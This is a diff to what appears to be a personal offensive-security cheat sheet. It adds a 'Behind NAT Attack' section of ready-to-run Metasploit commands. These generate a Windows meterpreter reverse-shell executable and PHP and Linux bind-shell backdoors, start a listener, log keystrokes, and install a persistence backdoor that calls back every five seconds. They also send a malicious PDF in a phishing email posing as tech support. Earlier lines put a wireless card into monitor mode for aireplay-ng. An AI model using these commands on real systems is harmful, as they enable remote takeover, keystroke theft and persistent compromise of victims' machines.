@@ -73,11 +73,64 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
 
 
-
 #############################
 # AirDump
 #############################
-$> sudo ifconfig wlan0 down
-$> sudo iwconfig wlan0 mode monitor
-$> sudo ifconfig wlan0 up
-$> sudo aireplay-ng wlan0
+sudo ifconfig wlan0 down
+sudo iwconfig wlan0 mode monitor
+sudo ifconfig wlan0 up
+sudo aireplay-ng wlan0
+
+
+#############################
+# Behind NAT Attack
+#############################
+https://null-byte.wonderhowto.com/how-to/perform-attack-over-wan-internet-0168583/
+
+// Creating the Payload
+msfvenom -l payoads
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp -e generic/none -f exe LHOST=10.11.12.13 LPORT=4444 > /root/Desktop/evil_public.exe
+
+// Port forward on attacker router port 4444
+
+// Start listener
+msfconsole
+use multi/handler
+    set PAYLOAD windows/meterpreter/reverse_tcp
+    set LHOST 10.0.0.2
+    set LPORT 4444
+exploit
+
+// Meterpreter Key logger
+keyscan_start
+keyscan_dump
+// Meterpreter execute
+execute -f cmd.exe
+
+// Meterpreter  leave back door for later access
+run persistence -h
+// connect back to attacker for every 5 seconds
+run persistence -U -i 5 -p 443 -r 192.168.1.71
+
+// Create payload for php
+msfvenom -p php/meterpreter/bind_tcp LPORT=4000 > /root/msf/php_backdoor.php
+// create linux payload
+msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=5000 > /root/msf/linux_backdoor 
+// create pdf payload
+https://www.offensive-security.com/metasploit-unleashed/client-side-exploits/
+use exploit/windows/fileformat/adobe_utilprintf
+sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
+
+
+// Embed meterpreter to images
+https://github.com/r00t-3xp10it/FakeImageExploiter
+
+// Meterpreter commands
+getuid
+sysinfo
+download
+use priv
+session
+execute
+
+
